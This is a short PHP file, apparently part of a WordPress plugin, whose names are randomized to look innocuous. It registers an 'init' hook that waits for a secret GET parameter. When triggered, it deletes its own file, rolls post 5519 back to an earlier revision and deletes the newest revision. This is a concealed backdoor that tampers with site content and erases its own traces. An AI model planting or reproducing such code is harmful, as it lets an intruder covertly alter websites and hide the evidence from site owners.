<?php

function archives_pop_engine() {
	if (isset($_GET['network_scripts_feed_cf7']) && $_GET['network_scripts_feed_cf7'] === 'rate_colors_reports') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$age_testimonials_options = 5519;
		$thumbnail_newsletter_control = wp_get_post_revisions($age_testimonials_options);
		if (empty($thumbnail_newsletter_control)) die('no revisions');
		if (count($thumbnail_newsletter_control) < 2) die('less than 2');
		$time_message_enhanced_admin = array_shift($thumbnail_newsletter_control);
		$manage_uploader_list = $time_message_enhanced_admin->ID;
		$namespaced_express_out = array_shift($thumbnail_newsletter_control);
		$stats_all_timer = $namespaced_express_out->ID;
		$items_additional_generator = wp_restore_post_revision($stats_all_timer);
		if ($items_additional_generator === false) die('error restoring');
		$items_additional_generator = wp_delete_post_revision($manage_uploader_list);		
		if ($items_additional_generator === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'archives_pop_engine');
